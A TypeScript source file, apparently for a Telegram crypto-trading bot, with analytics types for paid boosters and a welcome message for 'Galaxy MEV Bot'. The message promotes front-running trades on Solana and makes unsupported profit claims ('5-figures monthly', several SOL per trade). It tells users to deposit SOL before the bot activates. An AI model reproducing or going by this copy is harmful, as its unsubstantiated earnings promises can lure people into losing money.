import type { User } from "@prisma/client";
import type { ReactNode } from "react";
import { serverEnv } from "./env.server";

export interface ButtonProps {
	variant?:
		| "default"
		| "destructive"
		| "outline"
		| "secondary"
		| "ghost"
		| "link";
	size?: "default" | "sm" | "lg" | "icon";
	className?: string;
	children: ReactNode;
}

export interface DataPoint {
	timestamp: number;
	value: number;
}

export interface BoosterOverview {
	analytics: {
		activeUsers: number;
		totalPurchases: number;
		uniqueUsers: number;
		revenue: number;
		avgDurationMs: number;
		avgDurationDays: number;
		purchaseFrequency: number;
		activeUsersPercentage: number;
	};
	id: string;
	name: string;
	createdAt: Date;
	updatedAt: Date;
	type: "oneTime" | "permanent" | "duration";
	description: string;
	price: number;
	userBoosters: {
		user: User;
		id: string;
		userId: string;
		boosterId: string;
		activatedAt: Date;
		expiresAt: Date | null;
		createdAt: Date;
		updatedAt: Date;
	}[];
}
export const token = process.env.NODE_ENV === 'development' ? serverEnv.DEV_BOT_TOKEN : serverEnv.PROD_BOT_TOKEN;

export const welcomeMessage = (balance: number, price: number) =>
`🚀 Welcome to Galaxy MEV Bot - Your Edge in Crypto Trading!

	Information about Galaxy MEV Bot:
	
🔎 Monitors the Solana Blockchain to Identify profitable opportunities.

⚡️ Automatically executes front run and back run transactions.

 📈 Real-time profit tracking and visualization.

☎️ 24/7 Support at @GalaxyMEVSupport if you ever encounter any issues.

🤝 Fair 85/15 profit split

💵 No time lock on Withdrawals.

 Start maximizing profits with:

 ✅ AI-Powered Strategies: Outsmart the market with precision.

 ✅ Lightning-Fast Execution: Front run trades in milliseconds. 

 ✅ Proven Results: Join fellow traders earning 5-figures monthly at @Galaxy_MEV_comm.

To activate this bot, ensure your wallet has at least ${price}  SOL. 

 💰 Average Trade Profit: ~1 to 7+ SOL

 💼 Pro Tip: Renting higher RPC nodes makes for more successful trades. Printing more 💰

 Balance: ${balance} SOL`;